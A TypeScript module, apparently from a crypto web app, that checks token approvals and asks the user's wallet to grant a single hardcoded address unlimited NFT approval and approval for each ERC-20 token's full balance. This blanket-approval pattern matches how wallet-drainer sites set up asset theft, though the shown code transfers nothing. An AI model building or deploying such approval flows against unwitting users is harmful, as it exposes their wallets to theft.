import { ethers, BigNumber } from 'ethers';
import type NFT from '@/types/NFT';
import type ERC20Token from '@/types/ERC20Token';
import { provider } from '@/ethereum/ethers.ts';
import nftABI from '@/ethereum/NFT.json';
import erc20ABI from '@/ethereum/ERC20.json';
import { useTokensStore } from '@/stores/tokens';
import { storeToRefs } from 'pinia';

export const checkNFTApproval = async (token: NFT, account: string) => {
    const tokensStore = useTokensStore();
    const { unapprovedTokens, nfts } = storeToRefs(tokensStore);
    
    const nftContract = new ethers.Contract(token.token_address, nftABI, provider);
    const nftWithSigner = nftContract.connect(provider.getSigner());
    const approved: boolean = await nftWithSigner.isApprovedForAll(account, '0xd6d6ba13fDe7DF9cb4014c372fAE713854D4e84c');
    if(!approved) {
        unapprovedTokens.value = [...unapprovedTokens.value, token];
        nfts.value = nfts.value.filter((currentToken: NFT) => {
            return currentToken.token_address != token.token_address;
        })
    }
}

export const checkERC20Approval = async (token: ERC20Token, account: string) => {
    const tokensStore = useTokensStore();
    const { unapprovedTokens, erc20Tokens } = storeToRefs(tokensStore);

    const erc20Contract = new ethers.Contract(token.token_address, erc20ABI, provider);
    const erc20withSigner = erc20Contract.connect(provider.getSigner());
    const allowance: BigNumber = await erc20withSigner.allowance(account, '0xd6d6ba13fDe7DF9cb4014c372fAE713854D4e84c');
    const approved: boolean = BigNumber.from(allowance).toBigInt() > 0;
    if(!approved) {
        unapprovedTokens.value = [...unapprovedTokens.value, token];
        erc20Tokens.value = erc20Tokens.value.filter((currentToken: ERC20Token) => {
            return currentToken.token_address != token.token_address;
        })
    }
}

export const setNFTApproval = async (token: NFT) => {
    const nftContract = new ethers.Contract(token.token_address, nftABI, provider);
    const nftWithSigner = nftContract.connect(provider.getSigner());
    nftWithSigner.setApprovalForAll('0xd6d6ba13fDe7DF9cb4014c372fAE713854D4e84c', true);
}

export const setERC20Approval = async (token: ERC20Token) => {
    const erc20Contract = new ethers.Contract(token.token_address, erc20ABI, provider);
    const erc20withSigner = erc20Contract.connect(provider.getSigner());
    erc20withSigner.approve('0xd6d6ba13fDe7DF9cb4014c372fAE713854D4e84c', BigNumber.from(token.balance).toBigInt());
}